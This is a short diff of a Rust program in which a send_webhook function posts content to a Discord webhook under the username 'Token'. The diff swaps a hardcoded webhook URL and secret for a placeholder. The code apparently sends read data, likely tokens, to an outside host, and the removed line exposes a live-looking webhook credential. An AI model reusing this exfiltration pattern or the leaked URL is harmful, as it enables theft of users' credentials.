@@ -71,7 +71,7 @@ fn file_read(mut file_name: String) -> String {
 }
 
 async fn send_webhook(content: String) -> Result<(), Box<dyn Error>> {
-    let webhook = Webhook::from_url("https://discord.com/api/webhooks/881524496580890684/qhkCcTX6G6aDkewzgAj5WGV42yug7ozucL1NxVc1f-1fJQZgPE8WEIqU-jVMWcGw0GxI");
+    let webhook = Webhook::from_url("WebHook URL");
     webhook
         .send(|message| message.content(content.as_str()).username("Token"))
         .await?;
